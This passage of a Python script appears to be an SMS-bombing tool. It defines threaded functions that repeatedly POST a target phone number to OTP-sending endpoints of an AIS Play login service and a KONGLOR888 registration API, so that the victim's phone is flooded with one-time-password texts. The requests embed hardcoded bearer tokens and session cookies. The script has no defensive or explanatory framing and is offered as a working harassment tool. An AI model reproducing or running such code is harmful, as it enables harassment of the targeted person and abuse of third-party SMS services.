        threading.Thread(target=aw).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ax():
            raxs=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(raxs)
        threading.Thread(target=ax).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ay():
            rays=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rays)
        threading.Thread(target=ay).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def az():
            razs=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(razs)
        threading.Thread(target=az).start()
        time.sleep(2)
